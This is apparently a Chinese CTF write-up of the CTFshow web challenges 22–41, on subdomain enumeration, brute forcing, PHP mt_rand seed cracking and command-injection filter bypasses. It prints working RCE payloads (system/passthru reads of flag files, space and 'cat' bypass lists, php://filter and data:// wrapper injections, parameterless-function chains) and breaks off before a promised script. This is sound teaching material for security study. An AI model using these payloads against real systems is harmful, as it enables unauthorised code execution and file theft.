<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p><img src="/2022/03/08/CTFshow/image-20220118111615441.png" alt="image-20220118111615441"></p>
<p>子域名收集与爆破工具</p>
<p>1.查询DNS解析记录</p>
<p>如 MX CNAME 记录，使用 nslookup 命令就可以查询这些信息。查询DNS记录的方法，通过域名的NS服务器可以用”ls <a target="_blank" rel="noopener" href="http://domain.com&quot;的方式查询所有域名相关记录,但是可惜,现在的dns服务器大都禁用了这个功能以提高安全性./">http://domain.com&quot;的方式查询所有域名相关记录，但是可惜，现在的DNS服务器大都禁用了这个功能以提高安全性。</a></p>
<p>2.爬虫提取子域名</p>
<p>这类工具有很多，例如 burpsuite、appscan、awvs 都有爬虫的功能<img src="/2022/03/08/CTFshow/image-20220118114241220.png" alt="image-20220118114241220"></p>
<p>3.搜索引擎</p>
<p>搜索引擎提供了一些高级搜索指令，site 就可以查询相关的域名，其实搜索引起收录的网页也是通过爬虫来爬取的。</p>
<img src="/2022/03/08/CTFshow/image-20220118114324854.png" alt="image-20220118114324854" style="zoom:67%;">

<p>4.站点配置文件</p>
<p>crossdomain.xml，跨域策略配置文件<br> robots.txt，反爬虫配置文件，Robots 协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取</p>
<p>5.爆破的原理其实是通过枚举的方式来实现的（爆破域名顾名思义就是枚举的意思）枚举域名的A记录。例如，如果要爆破 test.com 的子域名</p>
<pre><code>首先的访问一个随机并不存在的域 abc.test.com
取得A记录后保存
开始枚举a-z0-9，比如1.test.com、 2.test.com 、3.test.com之类的。
接下来的步骤就分为两种方式了。
第一种：直接获取1.test.com 2.test.com 3.test.com的A记录，有 A 记录则表示存在也是可行的，但是如果遇到泛解析则该方法失效。
第二种，在泛解析的下也可以使用，把这些枚举的域名 A 记录与之前abc.test.com的A记录做对比，不同的则是存在A记录的域名，也就是在用的域名
</code></pre>
<p>6.在线平台一部分是穷举，此类跟本地的工具效果是一样的；另外一类是搜索引擎，通过 Alexa 和 Google 搜索，简单快捷，缺点是可能会缺少某些浏览量较低的域名，不是特别全面。在线平台特别多，在此举几个例子</p>
<p>暴力破解<br><a target="_blank" rel="noopener" href="http://z.zcjun.com/">http://z.zcjun.com/</a><br><a target="_blank" rel="noopener" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a><br><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></p>
<p>搜索引擎收录<br><a target="_blank" rel="noopener" href="http://alexa.chinaz.com/">http://alexa.chinaz.com</a></p>
<img src="/2022/03/08/CTFshow/image-20220118124922303.png" alt="image-20220118124922303" style="zoom:67%;">

<p>vip.ctf.show</p>
<img src="/2022/03/08/CTFshow/image-20220118123418810.png" alt="image-20220118123418810" style="zoom:67%;">

<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还爆破？这么多代码，告辞！</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dict</span> = <span class="string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=md5(<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">        <span class="keyword">if</span>(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((intval(substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+intval(substr(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+substr(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/substr(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===intval(substr(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&#x27;原字符串为:&#x27;</span>.<span class="variable">$dict</span>[<span class="variable">$i</span>].<span class="variable">$dict</span>[<span class="variable">$j</span>]);</span><br><span class="line">                <span class="keyword">echo</span> (<span class="string">&#x27;加密后字符串为:&#x27;</span>.<span class="variable">$token</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(<span class="selector-tag">a</span>,<span class="selector-tag">b</span>,c)函数，返回<span class="selector-tag">a</span>字符串，从<span class="selector-tag">b</span>开始，长度为c的字符串</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/08/CTFshow/image-20220119113632889.png" alt="image-20220119113632889"></p>
<p>点. 在php中用来连接两个字符串或变量的。</p>
<p><strong>intval()</strong> 函数用于获取变量的整数值。<strong>intval()</strong> 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p>
<p><img src="/2022/03/08/CTFshow/image-20220119112943153.png" alt="image-20220119112943153"></p>
<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p><img src="/2022/03/08/CTFshow/image-20220119140956990.png" alt="image-20220119140956990"></p>
<p><img src="/2022/03/08/CTFshow/image-20220119141021376.png" alt="image-20220119141021376"></p>
<p><img src="/2022/03/08/CTFshow/image-20220119141051254.png" alt="image-20220119141051254"></p>
<p><strong>php伪随机数：</strong></p>
<p>php伪随机数漏洞，php中重要的几个随机函数rand() 不指定参数时，范围0-32767，mt_rand() 不指定参数时，范围0-2^32-1srand() 给rand()函数播种，mt_srand() 给mt_srand()函数播种php是基于C开发的，C中生成随机数时，需要自己去一个种子，相同的种子产生的随机数是相同的，php中也一样，自己的理解：mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。所以，当种子一定时，接下来几次的随机数都是固定的</p>
<p>mt_srand()函数播种的时候，只有在第一次调用mt_rand()函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。</p>
<p>那 为什么是 伪随机数呢？</p>
<p><strong>因为同一个种子产生的随机数只会根据调用次数的不同产生不同的数。</strong></p>
<p> <strong>漏洞产生</strong></p>
<p>所以显而易见，随机数的产生，基于种子。但是，可以通过产生的随机数来猜测种子，进而推测后续的随机数。</p>
<p>需要指明的是，不同版本的php，同一个种子产生的随机数有可能不同。</p>
<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p><img src="/2022/03/08/CTFshow/image-20220119145040246.png" alt="image-20220119145040246"></p>
<p>由源码可以发现我们可以利用r=0得到mt_rand()相反的值</p>
<p><img src="/2022/03/08/CTFshow/image-20220119145020124.png" alt="image-20220119145020124"></p>
<p>使用php_mt_seed 回推出种子<img src="/2022/03/08/CTFshow/image-20220119155222121.png" alt="image-20220119155222121"></p>
<p><img src="/2022/03/08/CTFshow/image-20220119165355955.png" alt="image-20220119165355955"></p>
<p>r=mt_rand  token=mt_rand+mt_rand  上面种子一个一个试</p>
<p><img src="/2022/03/08/CTFshow/image-20220119165335174.png" alt="image-20220119165335174"></p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p><img src="/2022/03/08/CTFshow/image-20220119192222187.png" alt="image-20220119192222187"></p>
<p><img src="/2022/03/08/CTFshow/image-20220119191300328.png" alt="image-20220119191300328"></p>
<p><img src="/2022/03/08/CTFshow/image-20220119192015391.png" alt="image-20220119192015391"></p>
<p><img src="/2022/03/08/CTFshow/image-20220119192042083.png" alt="image-20220119192042083"></p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p><img src="/2022/03/08/CTFshow/image-20220119194102280.png" alt="image-20220119194102280"></p>
<p>打开录取名单</p>
<img src="/2022/03/08/CTFshow/image-20220119194645996.png" alt="image-20220119194645996" style="zoom:67%;">

<p>打开学生学籍信息查询系统，查学号</p>
<p><img src="/2022/03/08/CTFshow/image-20220119194716613.png" alt="image-20220119194716613"></p>
<p>需要爆破出生日，火狐抓取不到这个，查看网页源代码<img src="/2022/03/08/CTFshow/image-20220120222355359.png" alt="image-20220120222355359"></p>
<p>打开这个页面，就是网页源代码里的文件  post传参<img src="/2022/03/08/CTFshow/image-20220120221550505.png" alt="image-20220120221550505"></p>
<p>在bp里面加入第二个变量p<img src="/2022/03/08/CTFshow/image-20220120215012942.png" alt="image-20220120215012942"></p>
<p>构造payloads<img src="/2022/03/08/CTFshow/image-20220120215219382.png" alt="image-20220120215219382"></p>
<p><img src="/2022/03/08/CTFshow/image-20220120221628641.png" alt="image-20220120221628641"></p>
<p>\u606d\u559c\u60a8\uff0c\u60a8\u5df2\u88ab\u6211\u6821\u5f55\u53d6\uff0c\u4f60\u7684\u5b66\u53f7\u4e3a02015237 \u521d\u59cb\u5bc6\u7801\u4e3a\u8eab\u4efd\u8bc1\u53f7\u7801</p>
<p>Unicode解码：恭喜您，您已被我校录取，你的学号为02015237 初始密码为身份证号码 621022199002015237<img src="/2022/03/08/CTFshow/image-20220120222045923.png" alt="image-20220120222045923"></p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p><img src="/2022/03/08/CTFshow/image-20220121150757284.png" alt="image-20220121150757284"></p>
<p>诡异的0/1</p>
<p>爆破目录,去掉2.txt<img src="/2022/03/08/CTFshow/image-20220121150936152.png" alt="image-20220121150936152"></p>
<p>选择模式Cluster bomb</p>
<p><img src="/2022/03/08/CTFshow/image-20220121151034044.png" alt="image-20220121151034044"></p>
<p>构造payloads，payload1与payload2 都为数字<img src="/2022/03/08/CTFshow/image-20220121151258500.png" alt="image-20220121151258500"></p>
<p><img src="/2022/03/08/CTFshow/image-20220121152107557.png" alt="image-20220121152107557"></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><p><img src="/2022/03/08/CTFshow/image-20220121155601615.png" alt="image-20220121155601615"></p>
<p>过滤了flag ，eval():可以接受一个字符串str作为参数，并把这个参数作为脚本代码来执行。<strong>命令执行：带system(“”);</strong> <strong>绕过flag，通过*省略或者？代替</strong></p>
<p><img src="/2022/03/08/CTFshow/image-20220121160527232.png" alt="image-20220121160527232"></p>
<p>页面无显示，然后查看网页源代码<img src="/2022/03/08/CTFshow/image-20220121160609695.png" alt="image-20220121160609695"></p>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><p><img src="/2022/03/08/CTFshow/image-20220121163156964.png" alt="image-20220121163156964"></p>
<p>过滤了flag，php,system</p>
<p>方法一：</p>
<p><img src="/2022/03/08/CTFshow/image-20220121163736641.png" alt="image-20220121163736641"></p>
<p><img src="/2022/03/08/CTFshow/image-20220121163916210.png" alt="image-20220121163916210"></p>
<p>tac命令：反序输出文件的内容，文件的最后一行显示在第一行</p>
<p>cat命令用不了可能被过滤了</p>
<p>方法二：</p>
<p>过滤了system，只能用其他命令执行函数</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">system</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">passthru</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">shell_exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">popen</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">proc_open</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="title">pcntl_exec</span><span class="params">()</span></span></span><br><span class="line">反引号 同shell_exec() </span><br></pre></td></tr></table></figure>

<p>这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示</p>
<p>这里采用反引号绕过<img src="/2022/03/08/CTFshow/image-20220121165055553.png" alt="image-20220121165055553"></p>
<p>查看网页源代码即可得到flag</p>
<p>方法三：采用passthru()函数：payload：?c=passthru(“cat fla*”);</p>
<h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><img src="/2022/03/08/CTFshow/image-20220121223323191.png" alt="image-20220121223323191"></p>
<p>过滤了system|cat|flag|空格单引号</p>
<p>方法一：<img src="/2022/03/08/CTFshow/image-20220121223757658.png" alt="image-20220121223757658"></p>
<p>a=system(“cat flag.php”); 之后查看网页源代码得到flag</p>
<p>方法二：</p>
<p><strong>空格绕过</strong>                                                                                                                                                 </p>
<blockquote>
<p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
</blockquote>
<p><strong>cat被过滤</strong>                                                                                                                                                                             </p>
<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p>
<p>payload: ?c=passthru(“more%09f*”);   <img src="/2022/03/08/CTFshow/image-20220121225223264.png" alt="image-20220121225223264"></p>
<p>加反引号</p>
<p>payload：?c=include($_GET[“url”]);?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php           在base64解码即可</p>
<p>include（） 包含并运行指定文件。用法：                                                                        <?php include 'filename'; ?></p>
<h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><p><img src="/2022/03/08/CTFshow/image-20220123195829460.png" alt="image-20220123195829460"></p>
<p>又过滤了. 单引号，反引号，echo，分号，括号</p>
<p><img src="/2022/03/08/CTFshow/image-20220123200137401.png" alt="image-20220123200137401"></p>
<p>直接使用include构造payload：                                                                                                      </p>
<p> ?c=include$_GET[“a”]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>或者：?c=include$_POST[“a”]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>再base64解码即可。</p>
<h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p><img src="/2022/03/08/CTFshow/image-20220123215344010.png" alt="image-20220123215344010"></p>
<p>多过滤了双引号</p>
<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
<h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p><img src="/2022/03/08/CTFshow/image-20220123220748630.png" alt="image-20220123220748630"></p>
<p>多过滤了冒号</p>
<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php            同上</p>
<h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p><img src="/2022/03/08/CTFshow/image-20220123223117291.png" alt="image-20220123223117291"></p>
<p>多了小于，等于，payload 同上</p>
<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p>
<h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p><img src="/2022/03/08/CTFshow/image-20220123224059837.png" alt="image-20220123224059837"></p>
<p>多了/  [0-9]</p>
<p>payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php       同上</p>
<h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p><img src="/2022/03/08/CTFshow/image-20220123224414358.png" alt="image-20220123224414358"></p>
<p>过滤了flag，然后又是文件包含，运用伪协议读</p>
<p>php://filter 无法使用，原因：过滤了flag，无法读取flag.php</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:<span class="regexp">//</span>流会被当作php文件执行</span><br></pre></td></tr></table></figure>

<p>用法：<img src="/2022/03/08/CTFshow/image-20220123225716037.png" alt="image-20220123225716037"></p>
<p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
<p>此题无法使用input</p>
<p><strong>【data://协议】写入协议</strong></p>
<p>PHP.ini：</p>
<p>data://协议必须双在on才能正常使用；</p>
<p>allow_url_fopen ：on</p>
<p>allow_url_include：on</p>
<p>参考自：<a target="_blank" rel="noopener" href="http://php.net/manual/zh/wrappers.data.php">http://php.net/manual/zh/wrappers.data.php</a>, 官方文档上allow_url_fopen应为yes。</p>
<p>用法：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain,php程序代码</span><br><span class="line">data:<span class="regexp">//</span>text/plain;base64,</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.data:<span class="comment">//text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span><span class="meta">.data</span>:<span class="comment">//text/plain;base64,    </span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat fla*&quot;); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>可以不要?&gt;</p>
<p>然后查看网页源代码即可。</p>
<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><p><img src="/2022/03/08/CTFshow/image-20220124121243869.png" alt="image-20220124121243869"></p>
<p>由于多过滤掉php,所以采用data://text/plain;base64,</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=</span></span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTsgPz4=   是<span class="meta">&lt;?php</span> system(<span class="string">&quot;cat flag.php&quot;</span>); <span class="meta">?&gt;</span>  的base64编码，可以不要<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看网页源代码即可</p>
<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><p><img src="/2022/03/08/CTFshow/image-20220124131602848.png" alt="image-20220124131602848"></p>
<p>有.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&quot;cat fla*&quot;); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>此题必须要?&gt;</p>
<p> .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用</p>
<p><img src="/2022/03/08/CTFshow/image-20220124131948470.png" alt="image-20220124131948470"></p>
<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p><img src="/2022/03/08/CTFshow/image-20220124132915367.png" alt="image-20220124132915367"></p>
<p>过滤了引号、美元符号、冒号，这里可以构造无参数函数进行文件读取</p>
<p>一般括号里参数都要用引号，这里学习一下无参数RCE</p>
<p><strong>无参数</strong>的意思可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，<strong>不能带参数</strong></p>
<p><strong>print_r(scandir(‘.’))</strong></p>
<p>可以用来查看当前目录所有文件名</p>
<p>但是我们这里说的是要构造无参数的函数，所以我们要做的就是去掉这个点号</p>
<p>​         <strong>scandir() 函数返回指定目录中的文件和目录的数组</strong></p>
<ul>
<li>localeconv()  函数返回一包含本地数字及货币格式信息的数组。</li>
<li>current()        函数返回数组中的当前元素（单元）,默认取第一个值，</li>
<li>pos() 同 current()  ,是current()的别名</li>
<li>reset()   函数返回数组第一个单元的值，如果数组为空则返回 FALSE</li>
<li>array_reverse()逆转数组函数</li>
<li>next()函数进行下一个值的读取</li>
<li>ord()返回字符串中第一个字符的Ascii值</li>
<li><img src="/2022/03/08/CTFshow/image-20220124140605804.png" alt="image-20220124140605804"></li>
<li>readgzfile()也可读文件，常用于绕过过滤</li>
<li>dirname() ：返回路径中的目录部分</li>
<li>chdir() ：改变当前工作目录</li>
<li>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</li>
<li>array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li>
<li>show_source() 函数对文件进行语法高亮显示。</li>
<li>highlight_file() 函数对文件进行语法高亮显示。</li>
<li>readfile() 函数读取一个文件，并写入到输出缓冲。</li>
</ul>
<p>​         **localeconv() ** 函数 返回数组的第一项就是 .  (小数点)<img src="/2022/03/08/CTFshow/image-20220124144510476.png" alt="image-20220124144510476"></p>
<p>我们可以通过读取该小数点代替print_r(scandir(‘.’))中的小数点 ，读取数组第一项可以的函数有current()、pos() 、reset()</p>
<p>所以最终我们可以构造如下：查看当前目录所有文件名</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">current</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">pos</span>(<span class="title">localeconv</span>())));</span></span><br><span class="line"><span class="function"><span class="title">print_r</span>(<span class="title">scandir</span>(<span class="title">reset</span>(<span class="title">localeconv</span>())));</span></span><br></pre></td></tr></table></figure>

<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print<span class="constructor">_r(<span class="params">scandir</span>(<span class="params">dirname</span>(<span class="params">getcwd</span>()</span>))); <span class="comment">//查看上一级目录的文件</span></span><br></pre></td></tr></table></figure>

<p>此题，我们先查看当前目录所有文件名</p>
<p><img src="/2022/03/08/CTFshow/image-20220124141445757.png" alt="image-20220124141445757"></p>
<p>payload:?c=show_source(next(array_reverse(scandir(current(localeconv())))));    </p>
<p>或者  ?c=readfile(next(array_reverse(scandir(current(localeconv()))))); 查看源代码</p>
<p><img src="/2022/03/08/CTFshow/image-20220124141844065.png" alt="image-20220124141844065"></p>
<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p><img src="/2022/03/08/CTFshow/image-20220124230027276.png" alt="image-20220124230027276"></p>
<p>过滤了<strong>所有数字，所有字母，异或符号，加号符号，`符号，$符号，【符号，】符号，大括号（左），大括号（右），&amp;符号，-符号</strong></p>
<p>过滤了<code>$、+、-、^、~</code>使得<strong>异或自增和取反</strong>构造字符都无法使用</p>
<p>可以通过“或”运算来获得相应的字符，组成命令 或：|   脚本如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dechex()把十进制转为十六进制  </p>
<p>得到了rce_or.txt <img src="/2022/03/08/CTFshow/image-20220127211944518.png" alt="image-20220127211944518"></p>
<p>文件内容或运算后，url解码就是需要的字母     python脚本如下</p>
